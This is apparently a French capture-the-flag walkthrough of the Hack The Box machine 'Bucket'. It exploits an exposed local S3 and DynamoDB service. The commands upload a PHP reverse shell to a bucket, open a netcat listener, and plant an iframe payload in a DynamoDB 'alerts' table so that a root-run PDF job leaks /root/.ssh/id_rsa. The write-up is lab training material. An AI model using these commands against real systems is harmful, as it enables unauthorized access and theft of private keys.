On retrouve :

  • un service SSH OpenSSH 8.2p1 sur le port 22/TCP
  • un service HTTP Apache 2.4.41 sur le port 80/TCP
  • OS Linux Ubuntu

Si je me rends sur le site sous le port 80, on tombe sur une plateforme publicitaire Bucket qui nous permet de personnaliser les annonces en fonction de notre activité.

Dans le code source, on peut voir que les images des articles proviennent d’un sous-domaine s3.bucket.htb, ce qui me fait directement penser au service de stockage s3 d’Amazon Web Services (AWS).

Je l’ajoute dans /etc/hosts pour continuer l’énumération.

Enumération web

En ajoutant le sous-domaine dans l’URL, je tombe sur une page page blanche avec le status running qui nous indique qu’il y a un service en cours d’exécution.

Si je prends n’importe quelle image du code source retrouvée sur le site, j’ai une réponse qui nous confirme la présence d’Amazon s3.

Le premier répertoire health révèle encore la présence d’AWS avec DynamoDB, un service de base de données NOSQL.

Rien d’intéressant pour /server-status, par contre /shell nous affiche une page AWS avec DynamoDB Web Shell.

Dans la FAQ sur l’interface, on retrouve son utilité.

Q. What is the DynamoDB Shell? The DynamoDB shell is interactive way to experience and try out the DynamoDB service through DynamoDB local. It is used for learning and testing purposes

En recherchant DynamoDB Web Shell sur Google, on tombe sur la documentation AWS qui nous explique que l’on peut utiliser AWS CLI pour interagir directement avec DynamoDB et d’autres services comme s3.

Amazon Web Services

Installation d’AWS CLI

Je commence par installer AWS CLI puis je vérifie que l’installation s’est bien passée en regardant sa version.

sudo apt install awscli -Y

──(kali㉿kali)-[~/infosec/htb/actives/bucket]
└─$ aws --version
aws-cli/1.19.1 Python/3.9.1+ Linux/5.10.0-kali3-amd64 botocore/1.20.0

On configure AWS en suivant cette documentation, la seule chose importante est d’indiquer le format de sortie des commandes comme table, json, text...

Enumération Amazon s3

À l’aide de la documentation, on a accès à plusieurs commandes comme ls (lister un bucket) mb (créer un bucket), cp (copier un objet du répertoire local dans un bucket ou inversement).

──(kali㉿kali)-[~]
└─$ aws s3 ls --endpoint-url http://s3.bucket.htb

Première connexion

Pour réaliser la première connexion, il me faut :

  • un reverse shell php
  • upload le reverse shell dans le bucket Amazon s3
  • ouvrir un listener
  • exécuter le fichier

Configuration du fichier rev.php

Upload dans le bucket adserver

──(kali㉿kali)-[~/infosec/htb/actives/bucket]
└─$ aws s3 --endpoint-url http://s3.bucket.htb cp rev.php s3://adserver/
upload: ./rev.php to s3://adserver/rev.php

──(kali㉿kali)-[~/infosec/htb/actives/bucket]
└─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/
                           PRE images/
2021-04-24 20:17:04       5344 index.html
2021-04-24 20:17:13       5493 rev.php

Ouverture d’un listener sur le port 9001

──(kali㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ..

Exécuter le fichier en entrant http://bucket.htb/rev.php dans l’URL.

Sous var/www/bucket-app, on retrouve plusieurs fichiers utilisés par root.

Le fichier index.php contient le même code html qu’avec la commande curl, avec du code php en plus.

<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>

Ce code indique

  • Si on effectue une requête curl POST get_alerts
  • Création d’une nouvelle instance DynamoDB
  • Recherche à l’aide de la commande scan (vu précédemment) d’une table nommée alerts et d’un titre contenant Ransomware
  • Afficher la sortie des données de cette table dans un fichier PDF en utilisant la commande Pd4Cmd et le placer dans var/www/bucket-app/files/${fileName}

On a pu voir que qu’il n’y avait qu’une seule table users lors de l’énumération de DynamoDB avec awscli. Essayons de crafter une table alerts en suivant cette documentation et la commande aws dynamodb help.

Création de la table alerts

aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566

Payload pour voler le contenu de la clé privée RSA de root

aws dynamodb put-item \
    --table-name alerts \
    --item '{
        "title": {"S": "Ransomware"},
        "data": {"S": "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"}
      }' \
    --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
